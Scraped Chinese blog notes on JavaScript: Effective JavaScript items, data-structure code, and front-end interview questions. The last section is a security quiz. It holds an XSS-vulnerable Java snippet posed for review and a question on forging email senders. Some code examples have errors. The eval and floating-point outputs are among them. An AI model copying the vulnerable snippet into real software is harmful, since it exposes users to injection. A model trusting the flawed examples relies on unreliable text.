在栈跟踪中,函数表达式的名称通常作为入口使用, 1. 在Error对象和调试器中使用命名函数表达式改进栈跟踪2. 在ES3和有问题的JS环境中需要记住:函数表达式作用域会被Object.prototype污染3. 谨记在错误百出的JS环境中会提升命名函数表达式声明,并导致命名函数表达式的重复存储4. 考虑避免使用命名函数表达式或在发布前删除函数名 15. 当心局部块函数声明的作用域12345678910111213141516171819202122232425262728function f()&#123;return 'global';&#125;function test(x)&#123; function f()&#123;return 'local';&#125; // 覆盖外部global的同名函数 var result = []; if(x)&#123; result.push(f()); &#125; result.push(f()); return result;&#125;test(true); // ['local', 'local']test(false); // ['local']// 若将f函数移到局部块内,function f()&#123;return 'global';&#125;function test(x)&#123; var result = []; if(x) &#123; function f()&#123;return 'local';&#125; result.push(f()); &#125; result.push(f()); return result;&#125;test(true); // ['local', 'local'] 而非 ['local', 'global']test(false); // ['local'] 而不是 ['global']// 上行的test(false)在有些环境下执行结果并不一样，在chrome 57下为 Error: f is not a function// 因为函数声明提升，但是并没有将完整的函数体也提前 1. 始终将函数声明置于程序或被包含的函数的最外层以避免不可移植的行为2. 使用var声明和有条件的赋值语句替代有条件的函数声明 16. 避免使用eval创建局部变量eval能将字符串解析为js语句并执行12345function test(x)&#123; eval('var y=x;'); return y;&#125;test('hello'); // 'hello' eval函数直接执行赋予了外部调用者能改变test函数内部作用域的能力.12345678910111213141516var y = 'global';function test(src)&#123; eval(src); return y;&#125;test('var y = \"local\";'); // 'local'test('var z = \"local\";'); // 'global'// 使用IIFE能避免污染内部作用域var y = 'global';function test(src)&#123; (function ()&#123; eval(src); &#125;)(); return y;&#125;test('var y = \"local\";'); // 'global'test('var z = \"local\";'); // 'global' 1. 避免使用eval函数创建的变量污染调用者的作用域2. 若eval函数代码可能创建全局变量,将此调用封装到嵌套的函数中以防止作用域污染 17. 间接调用eval函数优于直接调用eval函数不仅仅是一个函数, 因为eval函数具有访问调用它时的整个作用域的能力.一般情况下,函数调用涉及eval标识符时,被认为是直接调用eval函数123456var x = 'global';function test()&#123; var x = 'local'; return eval('x'); // 直接调用&#125;test(); // 'local' 这种情况下, 编译器需要确保被执行的程序具有完全访问调用者局部作用域的权限 而其他调用eval函数的方法被认为是间接的,这些方式在全局作用域内对eval函数的参数求值.例如绑定eval函数到另外一个变量名, 通过该变量名调用函数会使代码失去对所有局部作用域的访问能力12345678var x = 'global';function test()&#123; var x = 'local'; var f = eval(); // 间接调用 return f('x');&#125;test(); // 'global'// 在chrome下为 Error: f is not a function 编写间接调用eval函数的一种简单方式是使用表达式序列运算符(逗号,)和一个毫无意义的数字字面量(0,eval)(src);这种方式被认为是间接调用eval函数.","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"effective-javascript","slug":"effective-javascript","permalink":"https://github.com/xmoyKING/tags/effective-javascript/"},{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"}]},{"title":"effective javascript笔记-1","slug":"effective-javascript","date":"2017-02-24T03:43:18.000Z","updated":"2017-12-06T14:50:08.946Z","comments":true,"path":"2017/02/24/effective-javascript/","link":"","permalink":"https://github.com/xmoyKING/2017/02/24/effective-javascript/","excerpt":"","text":"让自己习惯JavaScript1. 了解JavaScript版本主要了解ES5中引入的版本控制考量——严格模式（strict mode），此特性允许选择在受限制的JavaScript版本中禁止使用一些JS语言中问题较多或易于出错的特性。考虑到向后兼容，即使在没有实现严格模式检查的环境中依然可以执行严格代码（strict code）。 启动方式：可以在程序的最开始添加一个特定的字符串字面量（literal） &quot;use strict&quot;;也可以在函数体最顶部开始处加入这个指令启动该函数内的严格模式。1234function()&#123; \"use strict\"; //...&#125; 解释执行字符串字面量没有任何副作用，所以ES3引擎执行该指令后立即丢弃执行结果，对程序并没有影响。但是，由于旧版本的ES引擎不会进行任何的严格模式检查，若代码没有在ES5环境中测试过，则ES3中的代码在ES5中很有可能会出错123456function()&#123; \"use strict\"; var arguments = []; //error： redefinition of arguments //在严格模式下，不能重定义arguments变量，但是若在非严格模式下则可以执行 //...&#125; 由于&quot;use strict&quot;;只在脚本或函数的顶部生效，所以若连接两个js脚本文件，则有可能会出错，这种情况下应使用立即调用的函数表达式（Immediately Invoked Function Expression，IIFE），并在每一个IIFE函数顶部添加严格模式指令123456789101112131415(function()&#123; \"use strict\"; function bar()&#123; //... &#125; //...&#125;)()(function()&#123; \"use strict\"; function foo()&#123; //... &#125; //...&#125;)() IIFE这种方式多用于库或模块系统的设计中。 1. 需要确保所使用的JS的特性在程序将要运行的环境中都是可用的2. 总是在严格模式检查环境下测试代码3. 当心连接不同严格模式下的不同的脚本 2. 理解JS的浮点数JS和其他语言不同，JS只有一种数值数据类型，那就是number,不管是整数还是浮点数，JS都将其归为数字。123typeof 16; //\"number\"typeof 98.5; //\"number\"typeof -2.1; //\"number\" JS中所有的数字都是双精度浮点数,IEEE754标准64位double类型,一般的+,-,*,%都是没有问题的,但是位算术运算符比较特殊.JS不会直接将操作数作为浮点数运算,而是会将其隐式的转换为32位整数后进行运算(32位大端Big-endian的2的补码表示的整数),实例如:18|1; //9 其实是将数字8转化为二进制1000,数组1转化为二进制1(多余的前导0省略了),然后进行位运算 可以查看数字类型的二进制,toString方法的参数表示进制1(8).toString(2); // \"1000\" 可以将字符串转按照对应进制转化为十进制的数1parseInt('1001',2); // 9 使用浮点数的时候需要注意:由于精度有限,即使是64位,但还是存在误差,所以对小数的浮点数进行操作的时候最好将其先转化为整数(银行内就是这样做的,按照最小的货币单位进行计算,比如分)123456(0.1+0.2)+0.3; // 0.6000000000000000000010.1+(0.2+0.3); // 0.6//双精度double的整数范围在 -2^53 -- 2^53 之内(1+2)+3; // 61+(2+3); //6 3. JS中的隐式的强制转换13 + true; // 4 上式就是由于JS对类型的隐式转换导致的,在大多数情况下,JS不会抛出错误,而是按照多种多样的自动转换方式将值强制转换为期望的类型,例如:算术运算符 - , * , / 和 % 在计算之前都会尝试将参数转换为数字,而对运算符 + , 具体是数字相加还是字符串连接,取决于参数的类型. 一般而言,只要有字符串则优先使用字符串连接的方式123456782 + 3; // 5\"hello\" + \" world\"; // \"hello world\"\"2\" + 3; // \"23\"2 + \"3\"; // \"23\"// JS对操作顺序敏感,即符合左结合,1 + 2 + \"3\"; // \"33\" 相当 (1 + 2) + \"3\";1 + \"2\" + 3; // \"123\" 相当 (1 + \"2\") + 3; 位运算不仅会将操作数转换为数字,二期还会将操作数转换为32位整数, 位运算符包括:位算术运算符(~ , &amp; , ^ , |) 和 移位运算符(&lt;&lt; , &gt;&gt; , &gt;&gt;&gt;)12\"17\" * 3; // 51\"8\" | \"1\"; // 9 但强制转换也隐藏了错误,结果为null的变量在算术运算符中不会导致失败,而是被隐式转换为0,一个未定义的变量将被转换为特殊的浮点数值NaN(not a number), NaN是唯一一个不等于自身的值,12345678910111213var x = NaN; x === NaN; // false ``` 同时,标准库函数`isNaN()`也不靠谱,因为它自身带有隐式强制转换,在测试其他参数之前,会将参数转换为数字, 所以,除非你知道值是数字,你可以使用`isNaN()`测试它是否是`NaN` ```jsisNaN(NaN); // true``` 但对于其他绝对不是NaN,但会被强制转换为NaN的值,使用isNaN方法无法区分```jsisNaN('foo'); // trueisNaN(undefined); // trueisNaN(&#123;&#125;); // trueisNaN(&#123;valueOf:\"foo\"&#125;); // true 所以,使用简单但可靠的比较自身来检查一个值是否为NaN1234567891011121314151617181920var a = NanN;a !== a; // truevar b = \"foo\";b !== b; // falsevar c = undefined;c !== c; // falsevar d = &#123;&#125;;d !== d; // falsevar e = &#123;valueOf: \"foo\"&#125;; // falsee !== e; // false//将其抽象为一个实用工具函数function isReallyNaN(x)&#123; return x !== x;&#125; 对象也可以被强制转换为原始值,最常见的用法是转换为字符串12345\"the Math object: \" + Math; // \"the Math object: [object Math]\"\"the JSON object: \" + JSON; // \"the JSON object: [object JSON]\"Math.toString(); // \"[object Math]\"Math.toString(); // \"[object JSON]\" 对象也可以转换为数字,通过valueOf方法12\"J\" + &#123;toString: function()&#123;return \"S\";&#125;&#125;; // \"JS\"2 * &#123;valueOf: function()&#123;return 3;&#125;&#125;; //6 特别是,当一个对象同时包含toString和valueOf方法时,运算符+应该调用哪个方法并不明显,做字符串连接还是加法应该根据参数的类型,但是存在隐式的强制转换,因此类型并不是显而易见!JS默认选择valueOf而不是toString方法解决这种选择,所以产生的行为将出乎意料:12345678910var obj = &#123; toString: function()&#123; return \"[object MyObject]\"; &#125;, valueOf: function()&#123; return 17; &#125;&#125;\"object: \" + obj; // \"object: 17\" 上面例子说明,valueOf方法才是为那些代表数值的对象(如Number对象)而设计的.对于这些数值对象,toString和valueOf应该返回一样的结果(相同的数字的字符串或数值)一般的,字符串的强制转换远比数字的强制转换更常见,有用.最好避免使用valueOf,除非对象确实是一个数字的抽象,并且obj.toString()能产生一个obj.valueOf()的字符串表示. 最后一种强制转换有时称为真值运算(truthiness). if || &amp;&amp;等运算符逻辑上需要布尔值作为操作参数,但实际上可以接受任何值.JS按照简单的隐式强制转换规则将值解释为布尔值. 大多数JS值都为真值,也就是能隐式转换为true 对字符串和数字以外的其他对象, 真值运算不会隐式调用任何强制转换方法 JS中有7个假值: false, 0, -0, &quot;&quot;, NaN, null, undefined,其他都为真值123456789101112131415161718// 一个带默认值的接受可选参数的函数function point(x, y)&#123; if(!x) x = 320; if(!y) y = 240; return &#123;x: x, y: y&#125; &#125;point(0, 0); // 本来预计输出原点&#123;x: 0, y: 0&#125;,却输出&#123;x: 320, y: 240&#125;// 检查参数是否为undefined更为严格的方式是使用typeoffunction point(x, y)&#123;if(typeof x === 'undefined') x = 320;if(typeof y === 'undefined') y = 240;return &#123;x: x, y: y&#125; &#125;point(); // &#123;x: 320, y: 240&#125;point(0,0); // &#123;x: 0, y: 0&#125;//另外一种方式是直接与 undefined 比较if(x === undefined) &#123;//...&#125; 注意:1. 类型错误可能会被隐式的强制转换隐藏2. 重载的运算符+进行加法还是连接操作取决参数类型3. 对象通过valueOf转换为数值,toString转为字符串4. 具有valueOf方法的对象应该实现toString方法,返回一个valueOf方法产生的数字的字符串表示5. 测试一个值是否为未定义,应该使用typeof或与undefined比较,而不是直接进行真值运算 4.原始类型优于封装对象除对象外,JS有5种原始值类型: 布尔值, 数字, 字符串, null 和 undefined. 但typeof null 的结果却是”object” JS标准库提供了构造函数来封装布尔值,数字和字符串作为对象.1234567891011121314// String对象的行为和封装的字符串值类似var s = new String(\"Hello\");s + \" World\"; // \"Hello World\"s[4]; // \"o\"// 但是不同点在于,String对象是一个真正的对象typeof \"Hello\"; // \"string\"typeof s; // \"object\"// 即不能用内置的操作符比较两个截然不同的String对象的内容// 因为每个String对象都是一个单独的对象,其只等于自身var s1 = new String(\"hello\");var s2 = new String(\"hello\");s1 === s2; // falses1 == s2; // false 其主要用处为: 这些对象有一些实用方法, 结合隐式强制转换,可以方便的使用这些方法 当对原始值提取属性或进行方法调用时,它表现得像已经使用了对应对象类型封装了该值一样.12345\"hello\".toUpperCase(); // \"HELLO\"// 而隐式封装的一个结果就是当对原始值设置属性,但对其没有任何作用// 因为每次隐式封装都会产生一个新的String对象,所以这种设置原始值属性的方法是没有意义的\"hello\".property1 = 1;\"hello\".property1; // undefined 1. 当做相等比较时,原始类型的封装对象与其原始值行为不一样2. 获取和设置原始类型值的属性会隐式创建封装对象 5. 避免对混合类型使用 == 运算符12// 表达式的值是什么? \"1.0e0\" == &#123;valueOf: function()&#123;return true;&#125;&#125;; 结果为true, 由于隐式强制转换, 在比较之前,他们都会转为数字, 字符串解析为数字1,匿名对象调用自身的valueOf方法得到true, 然后再转换为数字, 得到1; 一般的,JS显示调用Number函数或者一些一元运算符+将值转换为数字,而更好的替代方式是使用严格相等运算符,当两个参数为同一类型时,== 和 ===没有差别, 但最好使用 === 1. 当参数类型不同时, == 运算符会发生隐式强制转换规则2. 使用 === 运算符, 使其不用任何转换规则比较3. 当比较不用类型的值时,使用自定义的显示强制转换工具函数使程序清晰 6. 了解分号插入的局限JS的自动分号插入(automatic semicolon insertion)是一种程序解析技术,能推断某些上下文中省略的分号 分号插入规则1分号仅在 { 标记之前, 一个或多个换行之后 或 程序输入的结尾 被插入也就是说,只能在一行, 一个代码块和一段程序结束的地方省略分号 1234567function square()&#123; var n =+ x return n * n&#125;function area(r)&#123;r = + r; return Math.PI * r * r&#125;function area(r)&#123;r = + r return Math.PI * r * r&#125; // errorfunction add1(x)&#123;return x + 1&#125; 分号插入规则2分号仅在随后的输入标记不能解析时插入 123456789a = b(f());// 等价于a = b(f());// 以下则被解析为两句// 因为 a = b f(); 是错误的a = bf(); 若某条语句的下一行的初始标记不能被解析为一个语句的延续,那么就不能省略该语句的分号 5个字符需要注意:( , [ , + , - , /以及数组字面量, 不能作为表达式运算符或一条语句的前缀,否则会有歧义12345678910a = b['r','g','b'].forEach(function(key)&#123; backgound[key] = foreground[key] / 2;&#125;);// 以上可解析为a = b['r','g','b'].forEach(function(key)&#123; backgound[key] = foreground[key] / 2;&#125;);// 其中,涉及到逗号表达式, 逗号分隔表达式依次从左至右执行, 并返回最后一个表达式的值// 上例中,返回字符b 注意连接两个立即调用函数表达式时123456789101112131415161718192021222324252627// file1.js(function()&#123; //...&#125;)()// file2.js(function()&#123; //...&#125;)()// 会被视作一条语句(function()&#123; //...&#125;)()(function()&#123; //...&#125;)()// 正确的方法是应该在文件头加上 ;// file1.js;(function()&#123; //...&#125;)()// file2.js;(function()&#123; //...&#125;)() 1. 分号仅在 { 标记之前, 一个或多个换行之后 或 程序输入的结尾被插入2. 分号仅在随后的输入标记不能解析时插入3. 注意连接两个立即调用函数表达式时4. 在return, throw, break, continue, ++, -- 的参数之前绝不能换行5. 分号不能作为for循环的头部或空语句的分隔符而被推导出, 即不会在for中加入分号 7. 视字符串为16位代码单元序列不是很明白啥意思 1. JS字符串由16位代码单元组成,而不是Unicode码点组成2. JS使用两个代码单元表示2^16极其以上的Unicode码点,这两个代码单元被称为代理对3. 代理对甩开了字符串元素计数, length, charAt, charCodeAt方法及其正则表达式模式(例如.)受影响4. 使用第三方库编写可是别码点的字符串操作5. 每当使用含有字符串操作的库时,需要查阅文档, 看它如何处理代码点的整个范围","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"effective-javascript","slug":"effective-javascript","permalink":"https://github.com/xmoyKING/tags/effective-javascript/"},{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"}]},{"title":"javascript数据结构与算法笔记-ES6","slug":"js-data-structure2","date":"2017-02-21T13:48:56.000Z","updated":"2017-02-20T16:00:00.000Z","comments":true,"path":"2017/02/21/js-data-structure2/","link":"","permalink":"https://github.com/xmoyKING/2017/02/21/js-data-structure2/","excerpt":"","text":"使用ES6语法，更全，讲解更清晰，建议观看Classic and high performance data structures implemented in javascript","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"},{"name":"data-structure","slug":"data-structure","permalink":"https://github.com/xmoyKING/tags/data-structure/"},{"name":"algorithms","slug":"algorithms","permalink":"https://github.com/xmoyKING/tags/algorithms/"}]},{"title":"学习JavaScript数据结构与算法笔记","slug":"js-data-structure","date":"2017-02-21T12:05:32.000Z","updated":"2017-02-20T16:00:00.000Z","comments":true,"path":"2017/02/21/js-data-structure/","link":"","permalink":"https://github.com/xmoyKING/2017/02/21/js-data-structure/","excerpt":"","text":"《学习JavaScript数据结构与算法》 笔记，以下为使用ES5的语法 数组 栈 队列 链表 集合 字典和散列表 树 图 排序和搜索算法 其他：动态规划，贪心算法 数组 添加和删除元素 使用array[array.length] = 11;或array.push()即可添加到最后，js中的数组是动态增长的，push方法可以添加任意多个元素，比如array.push(1,2,3)同时添加三个元素 方法array.unshift(1，2)可以直接把元素添加到数组首位 删除最后的元素用array.pop()方法，结合array.push()方法可以模拟栈 删除第一个元素用array.shift()方法，结合array.unshift()方法可以模拟基本队列 使用array.splice(5,3)方法可以删除数组相应位置和数量的元素，表示从索引5开始，删除3个元素 若array.splice(5,3,0,1,2)后面的三个参数表示用0，1，2代替原来被删除的3个元素 二维和多维数组 123matrix = []; matrix[0] = [];matrix[1] = []; 数组方法参考 123456789101112131415方法 描述concat() 连接两个或更多的数组，并返回结果。join() 把数组的所有元素放入一个字符串。元素通过指定的分隔符进行分隔。pop() 删除并返回数组的最后一个元素push() 向数组的末尾添加一个或更多元素，并返回新的长度。reverse() 颠倒数组中元素的顺序。shift() 删除并返回数组的第一个元素slice() 从某个已有的数组返回选定的元素sort() 对数组的元素进行排序splice() 删除元素，并向数组添加新元素。toSource() 返回该对象的源代码。toString() 把数组转换为字符串，并返回结果。toLocaleString() 把数组转换为本地数组，并返回结果。unshift() 向数组的开头添加一个或更多元素，并返回新的长度。valueOf() 返回数组对象的原始值 栈特点为先进后出，利用js数组实现一个栈类，具体代码为：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172function Stack()&#123; var items = []; this.push = function(element)&#123; items.push(element); &#125; this.pop = function()&#123; return items.pop(); &#125; this.peek = function()&#123; return items[items.length -1]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; console.log(this.toString()); &#125;&#125;//使用var stack = new Stack();stack.print(); //输出true...``` ### 利用栈将十进制转换为二进制将十进制数与2整除，直到结果为0，将每次获取的余数入栈，输出的时候一一出栈即可。```jsfunction dec2bin(dec)&#123; var rs = new Stack(), //余数数组 rem, //余数 s = ''; //二进制字符串 while(dec &gt; 0)&#123; //由于js的数字类型不区分整数or浮点数 //所以需要使用Math.floor仅返回除数的整数部分 rem = Math.floor(dec % 2); rs.push(rem); dec = Math.floor(dec / 2); &#125; while(!rs.isEmpty())&#123; //将数组中的元素出栈并转换为字符串连接 s += rs.pop().toString(); &#125; return s;&#125;//若需转化为任意进制，则需添加一个参数表示基数function dec2base(dec,base)&#123; var rs = new Stack(), //余数数组 rem, //余数 s = '', //二进制字符串 digits = '0123456789ABCDEF'; //将数字转化为对应字符 while(dec &gt; 0)&#123; //由于js的数字类型不区分整数or浮点数 //所以需要使用Math.floor仅返回除数的整数部分 rem = Math.floor(dec % base); rs.push(rem); dec = Math.floor(dec / base); &#125; while(!rs.isEmpty())&#123; //将数组中的元素出栈并转换为字符串连接 s += digits[rs.pop()]; &#125; return s;&#125; 队列特点为先进先出,利用js数组实现一个队列类，具体代码为：123456789101112131415161718192021222324252627function Queue()&#123; var items = []; this.enqueue = function(element)&#123; items.push(element); &#125; this.dequeue = function()&#123; return items.shift(); &#125; this.front = function()&#123; return items[0]; &#125; this.isEmpty = function()&#123; return items.length == 0; &#125; this.size = function()&#123; return items.length; &#125; this.clear = function()&#123; items = []; &#125; this.print = function()&#123; console.log(this.toString()); &#125;&#125;//使用var q = new Queue();q.print(); 优先队列元素的添加和删除是基于优先级的，所以需要传入第二个参数表示优先级，其他方法和普通队列一样123456789101112131415161718192021222324252627282930313233343536function PriorityQueue()&#123; var items = []; //内部类，将优先级和元素数值保存为一个类 function QueueElement(element, priority)&#123; this.element = element; this.priority = priority; //值越大，优先级越低 &#125; this.enqueue = function(element,priority)&#123; var qe = new QueueElement(element,priority); //新生成一个元素对象，保存数值和优先级 if(this.isEmpty())&#123; items.push(qe); //数组为空则直接添加到数组中 &#125;else&#123; var added = false; for(var i =0; i &lt; items.length; ++i)&#123; //优先级相同的，也是先进先出 if(qe.priority &lt; items[i].priority)&#123; //比较优先级 items.splice(i, 0, qe); //插入到找到元素之前 added = true; break; &#125; &#125; if(!added)&#123; //若added还是false，表示当前的元素优先级是最低的， items.push(qe); &#125; &#125; &#125; //...其他相同&#125;//使用var pq = new PriorityQueue();pq.enqueue('John',2);pq.enqueue('Jack',1);pq.enqueue('Came',1);pq.print(); //Jack,Came,John 循环队列-击鼓传花击鼓传花，一个圈，当停止时，传到谁就出局，直到剩下1个123456789101112131415161718192021function hotPotato(list, num)&#123; var q = new Queue(); for(var i = 0; i &lt; list.length; ++i)&#123; q.enqueue(list[i]); //将名字数组中的名字加入队列 &#125; var eliminated = ''; while(q.size() &gt; 1)&#123; for(i = 0; i &lt; num; ++i)&#123; q.enqueue(q.dequeue()); //未淘汰则继续加入队列 &#125; eliminated = q.dequeue(); //将淘汰的记录下来 console.log(eliminated + '淘汰了'); &#125; return q.dequeue(); //最后返回剩下的1个人&#125;//测试var names = ['A','B','C','D','E'];var win = hotPotato(names, 7);console.log(win + ' Win'); // A Win 链表链表无法用数组实现，需要定一个一个节点类，用next属性模拟指针，指向下一个节点，同时注意删除和添加时的指针指向 动态规划 DP（Dynamic Programing）最少硬币找零给出要找零的钱数，以及可用的硬币面额d1…dn极其数量，找到所需最少的硬币个数例如：d1 = 1， d2 = 5， d3 = 10， d4 = 25，要找36美分的零钱，结果是125 + 110 + 1*1 思想：设有n需要换零钱，找到n所需最少的硬币数量，在n - 1解的基础上求建立n的解，对前面的每一个数而言亦是如此，需要依次找到所有 x (x &lt; n) 的解123456789101112131415161718192021222324252627282930313233function MinCoinChange(coins)&#123; var coins = coins; //coins为面额数组，如[1,5,10,25] var cache = &#123;&#125;; //保存已经计算过的，不重复计算 this.makeChange = function(amount)&#123; var self = this; if(!amount)&#123; //若amount非正，则返回空数组 return []; &#125; if(cache[amount])&#123; //若存在缓存，则直接返回缓存 return cache[amount]; &#125; var min = [], newMin, newAmount; for(var i = 0; i &lt; coins.length; ++i)&#123; //对每一面额都计算newAmount var coin = coins[i]; newAmount = amount - coin; if(newAmount &gt;= 0)&#123; //若为正，则也计算newAmount的找零结果 newMin = self.makeChange(newAmount); &#125; if(newAmount &gt;= 0 &amp;&amp; (newMin.length &lt; min.length - 1 || !min.length) &amp;&amp; (newMin.length || !newAmount))&#123; //判断newAmount是否有效 min = [coin].concat(newMin); console.log('new min ' + min + ' for ' + amount); &#125; &#125; return (cache[amount] = min); &#125;&#125;//使用var m = new MinCoinChange([1,5,10,25]);console.log(m.makeChange(36)); 最少硬币找零的问题若使用贪心算法，则在某些情况下会出错，因为贪心总是尽可能先兑换最大面额，所以，当分别给出[1,3,4]和6参数的时候，贪心的结果是[4,1,1],而DP的结果是[3,3]","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"note","slug":"note","permalink":"https://github.com/xmoyKING/tags/note/"},{"name":"data-structure","slug":"data-structure","permalink":"https://github.com/xmoyKING/tags/data-structure/"},{"name":"algorithms","slug":"algorithms","permalink":"https://github.com/xmoyKING/tags/algorithms/"}]},{"title":"HTML5/JS实现的网页游戏","slug":"html5-js-game","date":"2017-02-21T08:24:26.000Z","updated":"2017-02-20T16:00:00.000Z","comments":true,"path":"2017/02/21/html5-js-game/","link":"","permalink":"https://github.com/xmoyKING/2017/02/21/html5-js-game/","excerpt":"","text":"分享几个令人震撼的JS和HTML5游戏 7款值得你心动的HTML5动画和游戏 什么是2048？2048有16个格子，初始时会有两个格子上安放了两个数字2，每次可以选择上下左右其中一个方向去滑动，每滑动一次，所有的数字方块都会往滑动的方向靠拢外，系统也会在空白的地方随即出现一个数字方块，相同数字的方块在靠拢、相撞时会相加。 2048","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"html5","slug":"html5","permalink":"https://github.com/xmoyKING/tags/html5/"},{"name":"game","slug":"game","permalink":"https://github.com/xmoyKING/tags/game/"}]},{"title":"前端面试题-3-库分析/链接","slug":"fe-interview-train-day3","date":"2017-02-16T13:36:33.000Z","updated":"2017-02-15T16:00:00.000Z","comments":true,"path":"2017/02/16/fe-interview-train-day3/","link":"","permalink":"https://github.com/xmoyKING/2017/02/16/fe-interview-train-day3/","excerpt":"","text":"以下链接知识点有重叠之处，需多加参考，查缺补漏，巩固查询。 jQuery分析jQuery-1.9.1源码分析系列完毕目录整理 思思博士 标签: jQuery 总体架构中，讲解jQuery入口函数的作用, 具体可参考 jQuery源码中的“new jQuery.fn.init()”什么意思？ 关于sizzle的博客不全，建议同时参考如下的博客 jQuery 2.0.3 源码分析Sizzle引擎 - 词法解析 jquery–选择器sizzle源码分析 最后有关于jQuery中jsonp的原理解析 【深入浅出jQuery】源码浅析–整体架构 jQuery原型链和静态函数列表图 jQuery, $工厂函数分析 实现一个简化版本的$入口","categories":[{"name":"interview","slug":"interview","permalink":"https://github.com/xmoyKING/categories/interview/"}],"tags":[{"name":"jquery","slug":"jquery","permalink":"https://github.com/xmoyKING/tags/jquery/"},{"name":"links","slug":"links","permalink":"https://github.com/xmoyKING/tags/links/"},{"name":"interview","slug":"interview","permalink":"https://github.com/xmoyKING/tags/interview/"},{"name":"lib","slug":"lib","permalink":"https://github.com/xmoyKING/tags/lib/"}]},{"title":"前端面试题-2-阿里技术之瞳前端问答题","slug":"fe-interview-train-day2","date":"2017-02-12T08:42:15.000Z","updated":"2017-12-06T14:50:08.961Z","comments":true,"path":"2017/02/12/fe-interview-train-day2/","link":"","permalink":"https://github.com/xmoyKING/2017/02/12/fe-interview-train-day2/","excerpt":"","text":"技术之瞳 阿里巴巴技术笔试心得 第四章 Web前端开发HTTP协议 4.4 请描述HTTP协议与HTTPS协议，分析两者的相同点和不同点 CSS 4.15 请阐述CSS实现三角形的原理 JavaScript 4.20 对比jsonp和document.domain+iframe做跨域的异同，分别指出其优缺点 4.22 补充代码空白部分，用JavaScript实现一个栈，实现基本的push、pop、top、length接口。1234...var stack = new Stack();stack.push(1);stack.pop(); 正则 4.24 给定如下的一段字符串和JavaScript对象字面量，需要将字符串中所有使用花括号括起来的关键字，统一替换为对象字面量中对应的键值，请使用正则表达式实现字符串的模版替换操作。字符串：&lt;a href=&quot;{href}&quot;&gt;{text}&lt;/a&gt;。对象字面量：{href: &#39;//www.taobao.com/&#39;, text: &#39;淘宝网&#39;}。要求： 1. 请给出用于匹配所有花括号关键词的正则表达式。 2. 请尽可能考虑正则表达式的兼容性、匹配的效率问题。 3. 使用原生JavaScript语言，不依赖任何框架或类库。 Node.js 4.25 编写一个简单的包，要求能够通过npm进行发布，发布成功后，能在另一个项目中进行调用。 4.26 如果出于公司的安全需要，不允许将代码上传到npm仓库中，但又处于模块化的考虑，需要提供给公司内的其他同事使用，那么怎样才是最佳方案？ 4.27 如何拼接多个Buffer为一个Buffer？ 4.28 如何实现一个Writable、Readable、Duplex流？ 4.29 如何保证Session的安全？ 4.30 如何实现在父进程退出时子进程跟着退出？ 4.31 实现一个能自动重启的HTTP服务集群 前端框架 4.32 简述React组件的生命周期 4.33 如果组件初始化时需要Ajax获取数据，代码应该写在哪里？ 前端工程化 4.34 请说出你所知道的前端项目构建工具，以及每种构建工具的优缺点 4.35 为了保证页面性能，需要对JS和CSS文件进行压缩与合并，请Node.js实现一个命令行工具实现这一功能。假定： - 在CSS中引入另一个CSS的语法为`@import url(&quot;b.css&quot;);` - JS通过`import&quot;my-module.js&quot;;`语法引入另一个模块。 - CSS的入口文件为app.css, JS的入口文件为app.js。 - 产出物存放在dist目录中。 要求： - 为每个JS和CSS文件按照原始目录结构生成压缩后的文件。 - app.js、app.css需要包含所依赖的全部文件。 4.36 请描述你参与的项目中使用的代码开发的分支策略。 数据可视化 4.38 浏览器兼容性是前端工作中必须考虑的一个问题，浏览器使用占比是进行技术决策的重要依据，下面是一个网站的浏览器周访问数据：123456789&#123; \"2015.11.11\": &#123;\"IE\": 135248, \"Chrome\": 356567, \"Firefox\": 69350, \"Safri\": \"32876\"&#125;, \"2015.11.12\": &#123;\"IE\": 125248, \"Chrome\": 356567, \"Firefox\": 69350, \"Safri\": \"32876\"&#125;, \"2015.11.13\": &#123;\"IE\": 115698, \"Chrome\": 356567, \"Firefox\": 69350, \"Safri\": \"32876\"&#125;, \"2015.11.14\": &#123;\"IE\": 145894, \"Chrome\": 356567, \"Firefox\": 69350, \"Safri\": \"32876\"&#125;, \"2015.11.15\": &#123;\"IE\": 103458, \"Chrome\": 356567, \"Firefox\": 69350, \"Safri\": \"32876\"&#125;, \"2015.11.16\": &#123;\"IE\": 110672, \"Chrome\": 356567, \"Firefox\": 69350, \"Safri\": \"32876\"&#125;, \"2015.11.17\": &#123;\"IE\": 146503, \"Chrome\": 356567, \"Firefox\": 69350, \"Safri\": \"32876\"&#125;&#125; 请基于这些数据绘制两张图： - 基于一周数据的浏览器分布比例图。 - 每天的浏览器占比变化趋势图。 要求: - 不能采用第三方绘图类库，仅允许使用浏览器原生API实现。 - 可不兼容IE及手机浏览器。 ##安全 Web安全 6.1 什么是fuzz？ 6.2 如何伪造发件人发送欺诈邮件？ 6.3 产生安全漏洞的原因是什么？ 6.4 下面代码有什么安全问题？请指出并修正。123456String msg = request.getParameter(\"msg\");if(msg.indexOf('&lt;') &gt; -1 || msg.indexOf('&gt;') &gt; -1)&#123; out.println(\"&lt;span&gt;error&lt;/span&gt;\");&#125;else&#123; out.println(\"&lt;input type=hidden name=msg value='\"+ msg +\"' /&gt;\");&#125; 6.4 